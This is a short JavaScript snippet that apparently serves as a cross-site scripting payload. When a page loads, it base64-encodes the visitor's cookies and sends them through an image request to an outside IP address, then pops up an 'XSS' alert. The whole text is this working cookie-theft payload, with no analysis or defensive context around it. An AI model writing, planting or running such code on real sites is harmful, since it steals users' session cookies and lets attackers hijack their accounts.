window.onload = function() {
  var img = new Image();
  img.src = 'http://49.13.194.218/log?cookie=' + encodeURIComponent(btoa(document.cookie));
  alert('XSS');
};
